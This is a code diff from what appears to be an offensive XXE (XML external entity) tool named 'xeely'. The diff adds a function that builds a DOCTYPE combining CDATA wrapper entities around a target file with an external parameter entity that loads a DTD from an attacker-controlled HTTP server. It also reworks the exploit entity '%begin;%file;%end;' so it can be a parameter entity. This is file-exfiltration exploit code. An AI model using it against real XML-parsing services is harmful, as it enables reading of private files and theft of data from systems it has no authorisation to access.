@@ -1,6 +1,8 @@
 import os
 from typing import List
+from typing import Sequence
 
+from .doctype import write_doctype_content_to_disk
 from xeely import RESOURCES_PATH
 from xeely.custom_http.server import HTTPServerParams
 from xeely.custom_xml import XMLEntity
@@ -24,21 +26,33 @@ def get_cdata_entities(file_entity_value) -> List[XMLEntity]:
     ]
 
 
-def create_cdata_dtd_file():
+def get_cdata_doctype_entities(
+    resource: str, http_server_params: HTTPServerParams
+) -> Sequence[XMLEntity | str]:
+    remote_entity_name = "remote"
+    entities: Sequence[XMLEntity | str] = [
+        *get_cdata_entities(resource),
+        XMLEntity(
+            _name=remote_entity_name,
+            _value=get_cdata_dtd_file_url(http_server_params),
+            _is_external=True,
+            _is_parameter=True,
+        ),
+        f"%{remote_entity_name};",
+    ]
+    return entities
+
+
+def create_cdata_dtd_file(is_parameter_entity: bool = False):
     entities = [
         XMLEntity(
             _name=CDATA_EXPLOIT_ENTITY_NAME,
             _value="%begin;%file;%end;",
+            _is_parameter=is_parameter_entity,
         )
     ]
-
-    with open(CDATA_FILE_PATH, "w") as file:
-        for entity in entities:
-            file.write(f"{entity.to_xml()}\n")
+    write_doctype_content_to_disk(CDATA_FILE_PATH, entities)
 
 
 def delete_cdata_dtd_file():
     os.remove(CDATA_FILE_PATH)
-
-
-create_cdata_dtd_file()
